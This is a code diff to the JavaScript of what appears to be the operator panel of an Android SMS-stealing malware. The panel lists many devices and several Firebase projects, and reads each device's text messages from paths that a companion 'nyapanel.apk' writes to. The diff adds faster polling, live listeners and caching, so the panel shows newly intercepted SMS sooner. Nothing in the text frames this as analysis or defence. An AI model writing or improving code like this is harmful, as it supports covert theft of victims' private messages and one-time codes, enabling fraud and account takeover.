@@ -20,8 +20,8 @@ var PAGE_VIEWS={home:'view-home',online:'view-online',onlypin:'view-onlypin',lik
 var LIKED_KEY='nya_liked_devices';
 var likedDevices={};
 var _procDevsTimer=null, _panelPaused=false;
-var SMS_POLL_MS=50, SMS_POLL_BG_MS=1500, SYNC_INTERVAL_MS=90000;
-var SMS_RENDER_DEBOUNCE_MS=50;
+var SMS_POLL_MS=800, SMS_POLL_BG_MS=3000, SYNC_INTERVAL_MS=90000;
+var SMS_RENDER_DEBOUNCE_MS=16;
 var _smsRenderTimer=null, _sendInFlight=false;
 var FB_LIST_KEY='nya_firebase_list';
 var ACTIVE_FB_KEY='rbl_active_fb';
@@ -148,9 +148,23 @@ function isJunkSmsPath(path){
   if(isHexDeviceKey(seg))return true;
   return false;
 }
+function getApkSmsPath(d){
+  return d&&d.rawId?'messages/'+d.rawId:'';
+}
+/** nyapanel.apk reads SMS only from messages/{deviceId} — rebel.py same */
+function shouldUseApkSmsPath(inst,d){
+  if(!inst)return true;
+  if(inst.config&&String(inst.config.id||'').indexOf('nya_')===0)return true;
+  if(inst.config&&inst.config.deviceNode==='clients')return true;
+  if(inst.config&&inst.config.preferredDeviceNode==='clients')return true;
+  if(inst.schema==='rabel'&&inst.rootKeys&&inst.rootKeys.indexOf('clients')>=0&&inst.rootKeys.indexOf('messages')>=0)return true;
+  if(d&&d.deviceNode==='clients')return true;
+  return false;
+}
 function getPrioritySmsPaths(d,inst){
   var id=d&&d.rawId, paths=[];
   if(!id)return paths;
+  if(shouldUseApkSmsPath(inst,d))return [getApkSmsPath(d)];
   if(inst&&inst.smsIndex&&inst.smsIndex[id]&&inst.smsIndex[id].roots&&inst.smsIndex[id].roots.length){
     inst.smsIndex[id].roots.forEach(function(root){if(root)paths.push(root+'/'+id);});
     return uniqPaths(paths);
@@ -160,10 +174,11 @@ function getPrioritySmsPaths(d,inst){
       if(root&&isInboundSmsRootNode(root))paths.push(root+'/'+id);
     });
   }
+  paths.unshift('messages/'+id);
   if(isRabelPanel(inst)||paths.length){
-    ['messages','user_sms','sms_backup','all_sms','new_sms'].forEach(function(root){
+    ['user_sms','sms_backup','all_sms','new_sms'].forEach(function(root){
       var p=root+'/'+id;
-      if(paths.indexOf(p)<0)paths.unshift(p);
+      if(paths.indexOf(p)<0)paths.push(p);
     });
   }
   return uniqPaths(paths);
@@ -184,6 +199,11 @@ function restJsonInstShallowNode(inst,node){
 }
 function buildSmsIndex(inst){
   if(!inst||inst.smsIndexReady)return Promise.resolve();
+  if(inst.rootKeys&&inst.rootKeys.indexOf('messages')>=0&&inst.rootKeys.indexOf('clients')>=0){
+    inst.smsIndex=inst.smsIndex||{};
+    inst.smsIndexReady=true;
+    return Promise.resolve();
+  }
   var scanRoots=['user_sms','sms_backup'];
   if(inst.smsRootKeys&&inst.smsRootKeys.length){
     scanRoots=uniqPaths(inst.smsRootKeys.filter(isInboundSmsRootNode).concat(scanRoots));
@@ -1987,6 +2007,7 @@ function attachSelectedDeviceLive(d){
   }catch(e){}
 }
 function selectDevice(id){
+  var wasSelected=selDev===id;
   selDev=id;
   var d=getSelDev();
   if(!d)return;
@@ -1998,9 +2019,18 @@ function selectDevice(id){
   renderDeviceDetail();
   fillDeviceSmsTo(d,true);
   attachSelectedDeviceLive(d);
-  var smsEl=document.getElementById('devListDeviceSms');
-  if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
-  loadSmsForDevice(true);
+  var cached=deviceSmsCache[id];
+  if(cached&&cached.list&&cached.list.length){
+    window_allSms=cached.list;
+    window_sms=cached.list.slice(0,80);
+    _smsLoading=false;
+    renderDeviceSmsList();
+  }else{
+    _smsLoading=true;
+    var smsEl=document.getElementById('devListDeviceSms');
+    if(smsEl)smsEl.innerHTML='<div class="empty">Loading SMS…</div>';
+  }
+  loadSmsForDevice(!wasSelected);
   window.scrollTo(0,0);
 }
 function renderSmsModal(){
@@ -2112,8 +2142,6 @@ function prefetchSmsForDevice(d){
   if(!d||deviceSmsCache[d.id]&&deviceSmsCache[d.id].list&&deviceSmsCache[d.id].list.length)return;
   var inst=getFbInstance(d.fbId);
   if(!inst)return;
-  var paths=getPrioritySmsPaths(d,inst);
-  if(!paths.length&&!deviceHasSmsInIndex(d))return;
   fetchSmsFast(inst,d).then(function(list){
     if(list&&list.length)setDeviceSms(d.id,list);
   });
@@ -2174,11 +2202,40 @@ function clearListeners(){
   });
   activeListeners={};
 }
+function attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn){
+  if(!inst||!inst.db||typeof applyFn!=='function')return;
+  var path=getApkSmsPath(d);
+  if(!path)return;
+  try{
+    var ref=inst.db.ref(path);
+    try{ref=ref.limitToLast(500);}catch(e2){}
+    var valHandler=function(snap){
+      if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+      if(!snap||typeof snap.exists==='function'&&!snap.exists())return;
+      applyFn(parseSmsRaw(typeof snap.val==='function'?snap.val():snap));
+    };
+    ref.on('value',valHandler);
+    listeners.refs.push({ref:ref,h:valHandler,type:'value'});
+    var addHandler=function(snap){
+      if(_panelPaused||seq!==_smsLoadSeq||selDev!==devId)return;
+      if(!snap)return;
+      var val=typeof snap.val==='function'?snap.val():snap;
+      var one=normalizeSms(Object.assign({},val||{},{id:snap.key}),snap.key);
+      if(one)mergeSmsIntoDevice(devId,[one]);
+    };
+    ref.on('child_added',addHandler);
+    listeners.refs.push({ref:ref,h:addHandler,type:'child_added'});
+  }catch(e){}
+}
 function attachSmsLiveListeners(inst,d,devId,seq,listeners,applyFn){
   if(!inst||!inst.db||typeof applyFn!=='function')return;
+  if(shouldUseApkSmsPath(inst,d)){
+    attachApkSmsLiveListener(inst,d,devId,seq,listeners,applyFn);
+    return;
+  }
   var paths=getPrioritySmsPaths(d,inst);
   if(!paths.length)paths=['messages/'+d.rawId,'user_sms/'+d.rawId,'sms_backup/'+d.rawId];
-  paths=uniqPaths(['messages/'+d.rawId].concat(paths)).slice(0,5);
+  paths=uniqPaths(['messages/'+d.rawId].concat(paths)).slice(0,3);
   paths.forEach(function(path){
     if(!path)return;
     try{
@@ -2319,9 +2376,19 @@ function fetchSmsPathsParallel(inst,paths){
 }
 function fetchSmsFast(inst,d){
   if(!inst||!d)return Promise.resolve([]);
-  var paths=getPrioritySmsPaths(d,inst);
-  if(!paths.length)paths=['user_sms/'+d.rawId,'sms_backup/'+d.rawId,'messages/'+d.rawId];
-  return fetchSmsPathsParallel(inst,paths.slice(0,6));
+  var apkPath=getApkSmsPath(d);
+  if(shouldUseApkSmsPath(inst,d)){
+    return restJsonInst(inst,apkPath).then(function(data){
+      return parseSmsRaw(data);
+    });
+  }
+  return restJsonInst(inst,apkPath).then(function(data){
+    var list=parseSmsRaw(data);
+    if(list.length)return list;
+    var paths=getPrioritySmsPaths(d,inst).filter(function(p){return p!==apkPath;}).slice(0,4);
+    if(!paths.length)return [];
+    return fetchSmsPathsParallel(inst,paths);
+  });
 }
 
 function fetchSmsFromPathsDirect(inst,d){
@@ -2372,15 +2439,25 @@ function loadSmsForDevice(force){
   var devId=d.id;
   var smsEmpty=document.getElementById('smsEmpty');
   if(smsEmpty)smsEmpty.classList.add('hidden');
-  showSmsForSelectedDevice();
   var cached=deviceSmsCache[devId];
-  _smsLoading=!cached||!cached.list||!cached.list.length;
-  renderSms();
+  if(cached&&cached.list&&cached.list.length){
+    window_allSms=cached.list;
+    window_sms=cached.list.slice(0,80);
+    _smsLoading=false;
+    renderSms();
+    renderDeviceSmsList();
+  }else{
+    showSmsForSelectedDevice();
+    _smsLoading=true;
+    renderSms();
+  }
 
   if(!force&&activeListeners[devId]&&activeListeners[devId].devId===devId){
     if(_smsLoading){
       var inst0=getFbInstance(d.fbId);
-      if(inst0) fetchSmsFast(inst0,d).then(function(list){if(list.length)setDeviceSms(devId,list);});
+      if(inst0)fetchSmsFast(inst0,d).then(function(list){
+        if(list&&list.length){_smsLoading=false;setDeviceSms(devId,list);}
+      });
     }
     return;
   }
@@ -2390,39 +2467,36 @@ function loadSmsForDevice(force){
   var inst=getFbInstance(d.fbId);
   if(!inst){toast('Firebase project not found',false);_smsLoading=false;return;}
 
+  var apkSms=shouldUseApkSmsPath(inst,d);
   var loadTimer=setTimeout(function(){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
     _smsLoading=false;
     if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)setDeviceSms(devId,[]);
     else renderSms();
-  },12000);
+  },apkSms?3500:12000);
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
-    if(list&&list.length){
-      clearTimeout(loadTimer);
-      _smsLoading=false;
-      setDeviceSms(devId,list);
-      return;
-    }
-    if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length)_smsLoading=true;
+    clearTimeout(loadTimer);
+    _smsLoading=false;
+    setDeviceSms(devId,list||[]);
   }
 
-  function poll(){
-    if(seq!==_smsLoadSeq||selDev!==devId)return;
-    if(_panelPaused)return;
-    fetchSmsFast(inst,d).then(applySmsList);
-    if(!inst.db){
-      fetchSmsFromPathsDirect(inst,d).then(applySmsList);
-    }
-  }
+  fetchSmsFast(inst,d).then(applySmsList);
 
-  poll();
-  var pollMs=inst.db?SMS_POLL_MS:SMS_POLL_BG_MS;
-  var timer=setInterval(poll,pollMs);
-  var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db};
-
+  var listeners={refs:[],devId:devId,seq:seq,loadTimer:loadTimer,live:!!inst.db,timers:[]};
   attachSmsLiveListeners(inst,d,devId,seq,listeners,applySmsList);
+
+  if(!apkSms){
+    var pollMs=inst.db?SMS_POLL_MS:SMS_POLL_BG_MS;
+    var timer=setInterval(function(){
+      if(seq!==_smsLoadSeq||selDev!==devId||_panelPaused)return;
+      fetchSmsFast(inst,d).then(applySmsList);
+      if(!inst.db)fetchSmsFromPathsDirect(inst,d).then(applySmsList);
+    },pollMs);
+    listeners.timer=timer;
+    listeners.timers=[timer];
+  }
 
   activeListeners[devId]=listeners;
 }
